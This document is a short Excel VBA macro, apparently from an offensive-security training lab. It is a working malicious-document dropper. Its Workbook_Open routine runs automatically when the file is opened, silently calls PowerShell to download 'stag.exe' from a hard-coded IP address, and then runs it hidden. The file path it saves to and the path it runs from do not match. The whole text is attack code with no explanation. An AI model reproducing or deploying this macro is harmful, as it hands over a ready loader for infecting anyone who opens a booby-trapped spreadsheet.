Private Sub Workbook_Open()
    Dim exePath As String
    
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.71/stag.exe', 'C:\Users\Offsec\Desktop\stag.exe')"
    Shell str, vbHide
    exePath = ActiveWorkbook.Path + "\stag.exe"
    Wait (2)
    Shell exePath, vbHide
End Sub


Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
